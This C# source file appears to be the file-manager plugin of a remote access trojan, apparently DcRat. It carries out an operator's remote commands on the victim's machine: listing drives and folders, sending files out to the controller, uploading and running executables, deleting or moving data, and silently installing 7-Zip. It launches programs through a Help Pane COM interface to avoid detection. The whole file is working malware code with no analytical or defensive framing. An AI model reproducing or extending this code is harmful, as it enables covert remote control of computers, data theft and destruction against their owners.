using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using MessagePackLib.MessagePack;

namespace Plugin.Handler
{
    public class FileManager
    {
        public FileManager(MsgPack unpack_msgpack)
        {
            try
            {
                switch (unpack_msgpack.ForcePathObject("Command").AsString)
                {
                    case "getDrivers":
                    {
                        GetDrivers();
                        break;
                    }

                    case "getPath":
                    {
                        GetPath(unpack_msgpack.ForcePathObject("Path").AsString);
                        break;
                    }

                    case "uploadFile":
                    {
                        var fullPath = unpack_msgpack.ForcePathObject("Name").AsString;
                        if (File.Exists(fullPath))
                        {
                            File.Delete(fullPath);
                            Thread.Sleep(500);
                        }

                        unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
                        break;
                    }

                    case "reqUploadFile":
                    {
                        ReqUpload(unpack_msgpack.ForcePathObject("ID").AsString);
                        ;
                        break;
                    }

                    case "socketDownload":
                    {
                        DownnloadFile(unpack_msgpack.ForcePathObject("File").AsString,
                            unpack_msgpack.ForcePathObject("DWID").AsString);
                        break;
                    }

                    case "deleteFile":
                    {
                        var fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                        File.Delete(fullPath);
                        break;
                    }

                    case "execute":
                    {
                        var fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                        Execute(fullPath);
                        break;
                    }

                    case "createFolder":
                    {
                        var fullPath = unpack_msgpack.ForcePathObject("Folder").AsString;
                        if (!Directory.Exists(fullPath)) Directory.CreateDirectory(fullPath);
                        break;
                    }

                    case "deleteFolder":
                    {
                        var fullPath = unpack_msgpack.ForcePathObject("Folder").AsString;
                        if (Directory.Exists(fullPath)) Directory.Delete(fullPath, true);
                        break;
                    }

                    case "copyFile":
                    {
                        Packet.FileCopy = unpack_msgpack.ForcePathObject("File").AsString;
                        break;
                    }

                    case "pasteFile":
                    {
                        var fullPath = unpack_msgpack.ForcePathObject("File").AsString;
                        if (fullPath.Length > 0)
                        {
                            var filesArray = Packet.FileCopy.Split(new[] { "-=>" }, StringSplitOptions.None);
                            for (var i = 0; i < filesArray.Length; i++)
                                try
                                {
                                    if (filesArray[i].Length > 0)
                                    {
                                        if (unpack_msgpack.ForcePathObject("IO").AsString == "copy")
                                            File.Copy(filesArray[i],
                                                Path.Combine(fullPath, Path.GetFileName(filesArray[i])), true);
                                        else
                                            File.Move(filesArray[i],
                                                Path.Combine(fullPath, Path.GetFileName(filesArray[i])));
                                    }
                                }
                                catch (Exception ex)
                                {
                                    Error(ex.Message);
                                }

                            Packet.FileCopy = null;
                        }

                        break;
                    }

                    case "renameFile":
                    {
                        File.Move(unpack_msgpack.ForcePathObject("File").AsString,
                            unpack_msgpack.ForcePathObject("NewName").AsString);
                        break;
                    }

                    case "renameFolder":
                    {
                        Directory.Move(unpack_msgpack.ForcePathObject("Folder").AsString,
                            unpack_msgpack.ForcePathObject("NewName").AsString);
                        break;
                        ;
                    }

                    case "zip":
                    {
                        if (Packet.ZipPath == null) CheckForSevenZip();
                        if (Packet.ZipPath == null)
                        {
                            Error("not installed!");
                            return;
                        }

                        if (unpack_msgpack.ForcePathObject("Zip").AsString == "true")
                        {
                            var sb = new StringBuilder();
                            var location = new StringBuilder();
                            foreach (var path in unpack_msgpack.ForcePathObject("Path").AsString
                                         .Split(new[] { "-=>" }, StringSplitOptions.None))
                                if (!string.IsNullOrWhiteSpace(path))
                                {
                                    sb.Append($"-ir!\"{path}\" ");
                                    if (location.Length == 0)
                                        location.Append(Path.GetFullPath(path));
                                }

                            Debug.WriteLine(sb.ToString());
                            Debug.WriteLine(location.ToString());
                            ZipCommandLine(sb.ToString(), true, location.ToString());
                        }
                        else
                        {
                            ZipCommandLine(unpack_msgpack.ForcePathObject("Path").AsString, false, "");
                        }

                        break;
                    }

                    case "installZip":
                    {
                        InstallSevenZip(unpack_msgpack);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
                Error(ex.Message);
            }
        }

        private void ZipCommandLine(string args, bool isZip, string location)
        {
            if (isZip)
                Process.Start(new ProcessStartInfo
                {
                    FileName = "\"" + Packet.ZipPath + "\"",
                    Arguments = $"a -r \"{location}.zip\" {args} -y",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    ErrorDialog = false
                });
            else
                Process.Start(new ProcessStartInfo
                {
                    FileName = "\"" + Packet.ZipPath + "\"",
                    Arguments =
                        $"x \"{args}\" -o\"{args.Replace(Path.GetFileName(args), "_" + Path.GetFileNameWithoutExtension(args))}\" -y",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    ErrorDialog = false
                });
        }

        private void CheckForSevenZip()
        {
            try
            {
                var sevenZip64 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                    "7-Zip", "7z.exe");
                var sevenZip32 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                    "7-Zip", "7z.exe");
                var dcratSvenzip = Path.Combine(Path.GetTempPath(), "7-Zip", "7z.exe");

                if (File.Exists(sevenZip64))
                    Packet.ZipPath = sevenZip64;

                else if (File.Exists(sevenZip32))
                    Packet.ZipPath = sevenZip32;

                else if (File.Exists(dcratSvenzip))
                    Packet.ZipPath = dcratSvenzip;

                else
                    Packet.ZipPath = null;
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        private void InstallSevenZip(MsgPack unpack_msgpack)
        {
            try
            {
                var dcratSvenzip = Path.Combine(Path.GetTempPath(), "7-Zip");
                if (!Directory.Exists(dcratSvenzip)) Directory.CreateDirectory(dcratSvenzip);

                using (var fs = new FileStream(Path.Combine(dcratSvenzip, "7z.exe"), FileMode.Create))
                {
                    fs.Write(unpack_msgpack.ForcePathObject("exe").GetAsBytes(), 0,
                        unpack_msgpack.ForcePathObject("exe").GetAsBytes().Length);
                }

                using (var fs = new FileStream(Path.Combine(dcratSvenzip, "7z.dll"), FileMode.Create))
                {
                    fs.Write(unpack_msgpack.ForcePathObject("dll").GetAsBytes(), 0,
                        unpack_msgpack.ForcePathObject("dll").GetAsBytes().Length);
                }

                Error("installation is done!");
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public void GetDrivers()
        {
            try
            {
                var allDrives = DriveInfo.GetDrives();
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Command").AsString = "getDrivers";
                var sbDriver = new StringBuilder();
                foreach (var d in allDrives)
                {
                    if (d.IsReady) sbDriver.Append(d.Name + "-=>" + d.DriveType + "-=>");
                    msgpack.ForcePathObject("Driver").AsString = sbDriver.ToString();
                    Connection.Send(msgpack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }

        public void GetPath(string path)
        {
            try
            {
                Debug.WriteLine($"Getting [{path}]");
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Command").AsString = "getPath";
                var sbFolder = new StringBuilder();
                var sbFile = new StringBuilder();

                if (path == "DESKTOP") path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                if (path == "APPDATA")
                    path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "AppData");
                if (path == "USER") path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

                foreach (var folder in Directory.GetDirectories(path))
                    sbFolder.Append(Path.GetFileName(folder) + "-=>" + Path.GetFullPath(folder) + "-=>");
                foreach (var file in Directory.GetFiles(path))
                    using (var ms = new MemoryStream())
                    {
                        GetIcon(file.ToLower()).Save(ms, ImageFormat.Png);
                        sbFile.Append(Path.GetFileName(file) + "-=>" + Path.GetFullPath(file) + "-=>" +
                                      Convert.ToBase64String(ms.ToArray()) + "-=>" + new FileInfo(file).Length + "-=>");
                    }

                msgpack.ForcePathObject("Folder").AsString = sbFolder.ToString();
                msgpack.ForcePathObject("File").AsString = sbFile.ToString();
                msgpack.ForcePathObject("CurrentPath").AsString = path;
                Connection.Send(msgpack.Encode2Bytes());
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
                Error(ex.Message);
            }
        }

        private Bitmap GetIcon(string file)
        {
            try
            {
                if (file.EndsWith("jpg") || file.EndsWith("jpeg") || file.EndsWith("gif") || file.EndsWith("png") ||
                    file.EndsWith("bmp"))
                    using (var myBitmap = new Bitmap(file))
                    {
                        return new Bitmap(myBitmap.GetThumbnailImage(48, 48, () => false, IntPtr.Zero));
                    }

                using (var icon = Icon.ExtractAssociatedIcon(file))
                {
                    return icon.ToBitmap();
                }
            }
            catch
            {
                return new Bitmap(48, 48);
            }
        }

        public void DownnloadFile(string file, string dwid)
        {
            var tempSocket = new TempSocket();

            try
            {
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "socketDownload";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Command").AsString = "pre";
                msgpack.ForcePathObject("DWID").AsString = dwid;
                msgpack.ForcePathObject("File").AsString = file;
                msgpack.ForcePathObject("Size").AsString = new FileInfo(file).Length.ToString();
                tempSocket.Send(msgpack.Encode2Bytes());


                var msgpack2 = new MsgPack();
                msgpack2.ForcePathObject("Pac_ket").AsString = "socketDownload";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack2.ForcePathObject("Command").AsString = "save";
                msgpack2.ForcePathObject("DWID").AsString = dwid;
                msgpack2.ForcePathObject("Name").AsString = Path.GetFileName(file);
                msgpack2.ForcePathObject("File").LoadFileAsBytes(file);
                tempSocket.Send(msgpack2.Encode2Bytes());
            }
            catch
            {
                tempSocket?.Dispose();
            }
        }

        public void Execute(string fullpath)
        {
            var ContaainChinese = false;
            for (var i = 0; i < fullpath.Length; i++)
                if (Regex.IsMatch(fullpath[i].ToString(), @"[\u4e00-\u9fbb]"))
                {
                    ContaainChinese = true;
                    break;
                }

            if (Regex.IsMatch(fullpath, @"(.*)(\.exe)$") && ContaainChinese == false)
            {
                var server = (IHxHelpPaneServer)Marshal.BindToMoniker("new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee");
                var target = new Uri(fullpath);
                server.Execute(target.AbsoluteUri);
            }
            else
            {
                Process.Start(fullpath);
            }
        }

        public void ReqUpload(string id)
        {
            try
            {
                var tempSocket = new TempSocket();
                var msgpack = new MsgPack();
                msgpack.ForcePathObject("Pac_ket").AsString = "fileManager";
                msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
                msgpack.ForcePathObject("Command").AsString = "reqUploadFile";
                msgpack.ForcePathObject("ID").AsString = id;
                tempSocket.Send(msgpack.Encode2Bytes());
            }
            catch
            {
            }
        }

        public void Error(string ex)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "fileManager";
            msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
            msgpack.ForcePathObject("Command").AsString = "error";
            msgpack.ForcePathObject("Message").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }

        [ComImport]
        [Guid("8cec592c-07a1-11d9-b15e-000d56bfe6ee")]
        [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        private interface IHxHelpPaneServer
        {
            void DisplayTask(string task);
            void DisplayContents(string contents);
            void DisplaySearchResults(string search);
            void Execute([MarshalAs(UnmanagedType.LPWStr)] string file);
        }
    }
}